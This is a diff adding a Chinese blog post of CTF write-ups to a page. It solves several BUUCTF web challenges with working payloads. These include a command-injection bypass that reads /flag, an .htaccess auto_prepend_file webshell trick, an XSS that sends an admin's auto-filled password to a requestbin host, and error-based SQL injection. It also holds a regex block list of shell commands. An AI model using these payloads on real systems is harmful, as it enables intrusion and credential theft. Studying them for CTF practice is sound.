+if(preg_match(&quot;&#x2F;\&#39;|\&#96;|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w&#x2F;is&quot;, $comm1))
+    $comm1 &#x3D; &quot;&quot;;
+if(preg_match(&quot;&#x2F;\&#39;|\&quot;|;|,|\&#96;|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w&#x2F;is&quot;, $comm2))
+    $comm2 &#x3D; &quot;&quot;;
+
+$flag &#x3D; &quot;#flag in &#x2F;flag&quot;;
+
+$comm1 &#x3D; &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;;
+$comm2 &#x3D; &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;;
+
+$cmd &#x3D; &quot;file $comm1 $comm2&quot;;
+system($cmd);
+?&gt;</code></pre>
+
+<p>payload</p>
+<pre class="language-none"><code class="language-none">?comm1&#x3D;&quot;;tac &#x2F;fla?;&quot;&amp;comm2&#x3D;1</code></pre>
+
+<p>利用管道符符分割命令，同时在命令前后加双引号进行闭合操作，再用通配符绕过对flag的过滤</p>
+<h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+    $files &#x3D; scandir(&#39;.&#x2F;&#39;); 
+    foreach($files as $file) &#123;
+        if(is_file($file))&#123;
+            if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;
+                unlink($file);
+            &#125;
+        &#125;
+    &#125;
+    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) &#123;
+        highlight_file(__FILE__);
+        die();
+    &#125;
+    $content &#x3D; $_GET[&#39;content&#39;];
+    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) &#123;
+        echo &quot;Hacker&quot;;
+        die();
+    &#125;
+    $filename &#x3D; $_GET[&#39;filename&#39;];
+    if(preg_match(&quot;&#x2F;[^a-z\.]&#x2F;&quot;, $filename) &#x3D;&#x3D; 1) &#123;
+        echo &quot;Hacker&quot;;
+        die();
+    &#125;
+    $files &#x3D; scandir(&#39;.&#x2F;&#39;); 
+    foreach($files as $file) &#123;
+        if(is_file($file))&#123;
+            if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;
+                unlink($file);
+            &#125;
+        &#125;
+    &#125;
+    file_put_contents($filename, $content . &quot;\nHello, world&quot;);
+?&gt;</code></pre>
+
+<p>有file_put_contents，可以试着写php文件进去</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220824204634727.png" alt="image-20220824204634727"></p>
+<p>发现没有被解析，可能是设置只允许解析index.php</p>
+<p>这时候可以尝试使用.htaccess</p>
+<p><strong>.htaccess 中有 # 单行注释符, 且支持 \拼接上下两行。(注意后面这个东西很重要)</strong></p>
+<p>[<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/116666720?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-116666720-blog-111307475.pc_relevant_multi_platform_featuressortv2dupreplace&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-116666720-blog-111307475.pc_relevant_multi_platform_featuressortv2dupreplace&utm_relevant_index=4">CTF].htaccess的使用技巧总结_Y4tacker的博客-CSDN博客_.htaccess ctf</a></p>
+<p>可以看一下y4师傅写的这个.htaccess的文章</p>
+<p>这个就是我们这道题的关键，因为unlink的限制，我们只被允许写入一个文件，所以只能尝试用.htaccess把自己包含掉</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220824213753335.png" alt="image-20220824213753335"></p>
+<pre class="language-none"><code class="language-none">filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\%0Ae%20.htaccess%0A%23%3C?php%20system(%27cat%20&#x2F;fla%27.%27g%27);?%3E\
+
+?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_append_fil\%0Ae%20.htaccess%0A%23&lt;?php system(&quot;cat &#x2F;f*&quot;);?&gt;\
+e
+两个不太一样的payload，区别在于auto_append_file和auto_prepend_file</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220824220105320.png" alt="image-20220824220105320"></p>
+<h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>login.js</p>
+<pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>cookie <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> cookies <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">var</span> cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cookies<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">var</span> arr <span class="token operator">=</span> cookies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> key <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        cookie<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>也就是把用户名和密码都写进了表单里</p>
+<p>注册个账户然后登录，可以看到有个类似留言框的东西</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825114219285.png" alt="image-20220825114219285"></p>
+<p>源码里还有一些过滤</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825114348683.png" alt="image-20220825114348683"></p>
+<p>这里可以用双写绕过，然后这里是可以执行js脚本的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825114150963.png" alt="image-20220825114150963"></p>
+<p>所以这题实际上就类似于一个xss</p>
+<p>login.js中的记住密码功能会将读取cookie中的password。于是我们可以构造一个登录框并且引入login.js提交反馈等待bot点开获得flag</p>
+<pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"password"</span> name<span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>scrcookieipt scookierc<span class="token operator">=</span><span class="token string">"./js/login.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span>
+<span class="token operator">&lt;</span>scrcookieipt<span class="token operator">></span>
+    <span class="token keyword">var</span> pwd <span class="token operator">=</span> docucookiement<span class="token punctuation">.</span><span class="token function">getcookieElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+    docucookiement<span class="token punctuation">.</span>locacookietion<span class="token operator">=</span><span class="token string">"http://http.requestbin.buuoj.cn/xxx/?a="</span><span class="token operator">+</span>pwd<span class="token punctuation">;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span></code></pre>
+
+<p><strong>只要我们写留言，就按前端代码的格式写，用户查看留言的时候留言的代码会嵌入到前端代码里执行。</strong></p>
+<p><strong>留言的内容大概是两个&lt;input&gt;标签，分别是username和password，然后&lt;script src=./js/login.js&gt;&lt;/script&gt;</strong></p>
+<p><strong>因为管理员查看的时候肯定是有cookie的，就会填充到两个input，然后用javasript的代码获取&lt;input&gt;的value，再用javascript代码</strong></p>
+<pre class="language-none"><code class="language-none">document.location&#x3D;&#96;&#96;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;xxxxxx&#x2F;?a&#x3D;&quot;&#96;&#96;+pwd;</code></pre>
+
+<p> 发送到平台上（http.requestbin.buuoj.cn可以看向它请求的http包）</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825115220166.png" alt="image-20220825115220166"></p>
+<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>已经告诉过滤了那些了</p>
+<p>先用order by试一下列数</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825115659726.png" alt="image-20220825115659726"></p>
+<p>可以测出有两列，那一列是uniqueid，另一列可能就是flag</p>
+<p>两种方式，一种是用万能密码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825120840923.png" alt="image-20220825120840923"></p>
+<p>另一种就是报错注入拿到密码</p>
+<pre class="language-none"><code class="language-none">1 and updatexml(1,concat(0x7e,(select group_concat(uniqueid) from users),0x7e),1)</code></pre>
+
+<p>837461526918364526</p>
+<p>做完之后看一下源码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825121558457.png" alt="image-20220825121558457"></p>
+<p>可以看到有个mysqli_num_rows函数来判断返回的行数，若为1才会进入if里面的内容，而在数据库里插入了两条数据<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825121702801.png" alt="image-20220825121702801"></p>
+<p>所以这里万能密码后边必须加上limit 0,1才能成功</p>
+<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2>
                 
             </div>
             <hr/>
@@ -3218,7 +4028,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">159.8k</span>
+                        class="white-color">170k</span>
             
             
             
